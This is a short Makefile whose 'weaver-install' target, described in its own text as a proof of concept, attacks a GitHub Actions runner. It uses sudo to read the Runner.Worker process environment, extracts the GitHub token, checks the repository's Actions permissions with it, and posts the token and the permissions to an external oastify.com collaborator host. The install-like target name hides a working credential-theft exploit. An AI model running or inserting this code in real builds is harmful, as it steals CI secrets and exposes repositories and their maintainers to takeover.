COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com

weaver-install:
	@echo "--- Starting Short-Form PoC ---"
	
	# 1. Extract the token directly from the process environment strings
	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker" | head -n 1))
	$(eval TOKEN := $(shell sudo cat /proc/$(WORKER_PID)/environ | tr '\0' '\n' | grep -m 1 "^system.github.token=" | cut -d= -f2))
	
	# 2. Check permissions using the extracted token
	@echo "Checking Token Permissions..."
	@curl -s -H "Authorization: Bearer $(TOKEN)" \
		https://api.github.com/repos/$(GITHUB_REPOSITORY)/actions/permissions > perms.json
	
	# 3. Exfiltrate Token and Permissions in one request
	@curl -X POST \
		-H "X-Captured-Token: $(TOKEN)" \
		-d @perms.json \
		$(COLLABORATOR_URL)/poc_impact
	
	@echo "--- PoC Complete ---"
